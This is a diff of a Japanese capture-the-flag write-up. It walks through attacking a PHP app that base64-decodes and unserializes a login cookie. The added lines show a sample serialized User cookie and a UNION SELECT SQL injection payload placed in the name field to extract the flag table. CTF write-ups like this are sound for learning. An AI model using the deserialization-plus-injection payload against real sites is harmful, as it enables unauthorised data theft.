@@ -144,7 +144,15 @@ function logout()
 `signup.php` から確認する。\
 引数の`＄user` は `＄user = new User(-1, $name, $pass)` からきているので、ここでインジェクション攻撃を起こすことは無理そう。（ _constructでエスケープ処理を行なっているため. ）\
 `user.php` を確認する。\
-引数の`$user` は `$user = unserialize(base64_decode($_COOKIE['__CRED']));` からきている。Cookieにセットした値をbase64でデコードして、それをデシリアライゼーションしている。`php unserialize` で調べると、脆弱性についての記事が見られたので、Cookieの値を変更することで攻撃が狙えそうである。攻撃の結果は`＄storeUser`に格納され、条件分岐`$user->password_hash === $storedUser->password_hash` を突破したら、Cookieにセットされる。`1_schema.sql` に flagsテーブルの構造が書いてあるので、あとは適切な攻撃文を選択すればフラグが手に入る。\
-`'UNION SELECT NULL, body, CONCAT('', {password_hashの値}) FROM flags; -- ` をセットして送信すると、レスポンスのCookieの値が変更されていて、これを元に戻す（base64でデコード＆デシリアライゼーション）と、フラグが含まれていた。
+引数の`$user` は `$user = unserialize(base64_decode($_COOKIE['__CRED']));` からきている。Cookieにセットした値をbase64でデコードして、それをデシリアライゼーションしている。`php unserialize` で調べると、脆弱性についての記事が見られたので、Cookieの値を変更することで攻撃が狙えそうである。攻撃の結果は`＄storeUser`に格納され、条件分岐`$user->password_hash === $storedUser->password_hash` を突破したら、Cookieにセットされる。`1_schema.sql` に flagsテーブルの構造が書いてあるので、あとは適切な攻撃文を選択すればフラグが手に入る。
+### _CRED
+```
+Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjU6IjE3MjQwIjtzOjQ6Im5hbWUiO3M6MzoidWhvIjtzOjEzOiJwYXNzd29yZF9oYXNoIjtzOjYwOiIkMnkkMTAkVjdld3dUMnFQZHlqam90cmV5Y1JNZWRPV3ZWY0hmNmh0TDgyeVJvNW1zQmNIZk5qODJYMnkiO30%3D
+```
+これをbase64でデコードすると
+```
+O:4:"User":3:{s:2:"id";s:5:"17240";s:4:"name";s:{nameの文字数}:{name};s:13:"password_hash";s:60:"$2y$10$V7ewwT2qPdyjjotreycRMedOWvVcHf6htL82yRo5msBcHfNj82X2y";}
+```
+`name` の部分に `'UNION SELECT NULL, body, CONCAT('', {password_hashの値}) FROM flags; -- ` をセットして, base64でデコードして送信すると、レスポンスのCookieの値が変更されていて、これを元に戻す（base64でデコード＆デシリアライゼーション）と、フラグが含まれていた。
 
 書くことが多いと、まとめ方がわからない...分かりづらくてごめんなさい（ ;  ; ）
